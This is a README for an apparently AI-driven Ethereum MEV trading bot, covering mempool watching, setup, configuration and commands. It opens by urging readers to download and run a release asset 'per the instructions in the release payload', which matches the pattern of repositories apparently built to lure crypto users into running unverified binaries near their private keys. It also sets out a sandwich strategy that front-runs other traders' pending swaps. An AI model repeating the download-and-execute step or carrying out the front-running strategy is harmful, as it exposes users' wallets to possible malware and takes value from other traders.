Quick access: use the Releases link above to get the compiled binary or script. If you download a release asset from that page, download the file and execute it per the instructions in the release payload.

## What this repo does

AITrading-ETH runs automated, on-chain trading strategies that watch the Ethereum mempool and DEX order flow. It combines real-time mempool signals, MEV-style sandwich/priority strategies, and algorithmic position management. The bot targets Uniswap-compatible DEXs and EVM chains.

This repo contains:
- Core bot engine (mempool listener, strategy runner, executor)
- Solidity helpers and sample contracts
- Connectors for Uniswap v2/v3-like routers
- Scripts to backtest and simulate trades

## Features

- Mempool watcher that parses pending transactions
- MEV-aware transaction selection and repricing
- Front-run / back-run templates for liquidity events
- Adaptive position sizing and slippage control
- Gas management and bundle submission support
- On-chain helper contracts for safe execution
- Backtesting harness and sandbox mode
- Metrics export in Prometheus format

## Architecture overview

![Architecture](https://raw.githubusercontent.com/ethereum/ethereum-org-website/master/static/images/logos/ethereum/ethereum.png)

- Mempool Listener: connects to an archive node or mempool provider (WS/HTTP) and streams pending transactions.
- Signal Engine: filters transactions by target DEX, token pairs, size, and pattern.
- Strategy Runner: implements AI-guided rules and classical algorithms for entry/exit.
- Executor: builds, signs, and broadcasts transactions. Supports private relays and flashbots/bundles.
- Monitor: collects telemetry, trade results, and alerts.

## Repo layout

- /cmd â€” CLI entry points and utilities
- /bot â€” core engine, strategy hooks
- /mempool â€” listeners and parsers
- /eth â€” Ethereum transaction builders and deploy helpers
- /contracts â€” Solidity helper contracts and deployment scripts
- /backtest â€” simulation and historical testing code

- /scripts â€” convenience scripts (deploy, testnet run)

## Requirements

- Linux or macOS
- Go >= 1.18 (if Go components used)
- Node >= 16 (for some scripts, optional)
- A full or archive Ethereum node with pending tx access or a mempool provider (WS)
- Private key for execution account (store on HSM or encrypted file)
- RPC provider with sufficient rate limit and balance for gas

## Quick install (developer setup)

1. Clone the repo
```bash
git clone https://github.com/Bryaehsu/AITrading-ETH.git
cd AITrading-ETH
```

2. Install dependencies (example)
```bash
# Go modules
go mod download

# Node tools (optional)
cd ui && npm install
```

3. Build the bot
```bash
go build -o aitrading-eth ./cmd/aitrading
```

## Run from Releases

The Releases page contains compiled binaries and release assets. Download the asset for your platform and execute it according to the included README in the release.

- Visit the releases page: https://github.com/Bryaehsu/AITrading-ETH/releases
- Download the appropriate file for your OS (e.g., `aitrading-eth-linux-amd64.tar.gz`).
- Extract and run:
```bash
tar -xzf aitrading-eth-linux-amd64.tar.gz
chmod +x aitrading-eth
./aitrading-eth --config ./config.yaml
```
If the release includes a script or installer, download that file and execute it per the release notes.

## Configuration

Place a `config.yaml` next to the binary or point to it with `--config`. Example keys:

- rpc:
  - url: "wss://your-node.example/ws"
- account:
  - private_key_path: "/secure/keys/key.enc"
- strategy:
  - type: "mempool-mev"
  - max_gas_price_gwei: 200
  - slippage_bps: 30
- tokens:
  - - name: "WETH"
    address: "0x..."
  - - name: "DAI"
    address: "0x..."

Keep private keys offline or encrypted. Use environment variables for secrets in CI.

## Common commands

Start in production mode:
```bash
./aitrading-eth --config=config.yaml --mode=prod
```

Run in sandbox (no broadcast, dry run):
```bash
./aitrading-eth --config=config.yaml --mode=sandbox
```

Run backtest:
```bash
go test ./backtest -run BacktestFull -v
```

Deploy helper contract:
```bash
./scripts/deploy_contract.sh --network mainnet --private-key $PK
```

## Example strategy (mempool-mev)

1. Listen to mempool for pending `swapExactTokensForTokens` calls on target router.
2. Detect large incoming swap that would move price > slippage threshold.
3. Build a front-run swap that buys before the large swap.
4. Submit both front-run and back-run transactions as a bundle (if using private relay).
5. Monitor execution and exit with profit target and max loss cut.

The strategy runner supports plug-in strategies. Create a new strategy struct that implements the Strategy interface in `/bot/strategy.go`.

## MEV and mempool details

- The mempool watcher tracks tx hash, gas price, nonce, input data, and emitted logs.
- Use heuristics to identify token purchase events, liquidity adds, or arbitrage windows.
- Gas management uses dynamic repricing and replacement-by-fee (RBF) with nonce control.
- Bundles: support for private relay or flashbots (bundle submission example in /scripts).

## Security practices

- Never hardcode keys. Use encrypted files or HSM.
- Run the bot in an isolated environment with limited network access.
- Limit the executor account balance to a comfortable operational amount.
- Audit Solidity helpers before mainnet deployment.
- Run unit tests and static analysis (`solhint`, `slither`) on contracts.

## Testing

- Unit tests: `go test ./...`
- Integration tests: `./scripts/integration_test.sh`
- Backtests: the backtest folder contains sample historical data and scenarios. Use the provided scripts to replay blocks and measure PnL.

## Monitoring and metrics

- The bot exposes metrics in Prometheus format at `/metrics` when enabled.
- Logs use structured JSON for easy ingestion.
- Alerts can forward to Slack or PagerDuty via webhook integration in `config.yaml`.

## Gas & cost control

- Set `max_gas_price_gwei` to avoid runaway fees.
- Use gas estimation and cap gas limit per strategy.
- For aggressive MEV strategies, prefer private relays or bundles to avoid gas war.

## Deploying contracts

Solidity helpers live in `/contracts`. To deploy:

```bash
cd contracts
npm install
npx hardhat run --network mainnet scripts/deploy.js
```

Use `--network` testnet for initial tests.

## Examples & screenshots

- Example trade logs appear in `/examples/trade-logs.md`.
- View a sample mempool event parsing snapshot in `/examples/mempool-snapshot.json`.

## FAQ

- Q: Can this run on other EVM chains?
  A: Yes. Change RPC endpoints and router addresses in `config.yaml`.

- Q: Does it support Uniswap v3?
  A: Yes, via the Uniswap v3 connector. You may need to tune slippage and fee tier.

- Q: How do I test bundle submission?
  A: Use the Flashbots test relay or a local private relay. See `/scripts/flashbots_example.sh`.
